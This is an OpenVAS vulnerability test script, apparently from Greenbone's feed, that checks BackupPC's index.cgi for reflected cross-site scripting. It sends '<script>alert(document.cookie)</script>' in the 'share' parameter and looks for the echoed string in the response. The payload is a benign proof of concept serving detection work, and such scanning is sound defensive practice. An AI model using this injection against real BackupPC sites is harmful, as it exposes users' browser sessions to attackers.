##############################################################################
# OpenVAS Vulnerability Test
#
# BackupPC 'index.cgi' Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802622");
  script_version("2019-05-24T11:20:30+0000");
  script_bugtraq_id(47628, 50406);
  script_cve_id("CVE-2011-3361", "CVE-2011-5081", "CVE-2011-4923");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2019-05-24 11:20:30 +0000 (Fri, 24 May 2019)");
  script_tag(name:"creation_date", value:"2012-04-04 14:49:38 +0530 (Wed, 04 Apr 2012)");
  script_name("BackupPC 'index.cgi' Multiple Cross Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44259");
  script_xref(name:"URL", value:"http://secunia.com/advisories/44385");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46615");
  script_xref(name:"URL", value:"http://www.ubuntu.com/usn/usn-1249-1");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/67170");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71030");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/multiple_xss_vulnerabilities_in_backuppc.html");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"BackupPC version 3.2.0 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied
  input to 'num' and 'share' parameters in index.cgi, which allows attackers to
  execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to BackupPC version 3.2.1 or later.");

  script_tag(name:"summary", value:"This host is running BackupPC and is prone to multiple cross site
  scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir (make_list_unique("/backuppc", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.cgi";

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>BackupPC"))
  {
    url += "?action=RestoreFile&host=localhost&num=1&share=" +
           "<script>alert(document.cookie)</script>";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>",
       extra_check:"<title>BackupPC"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);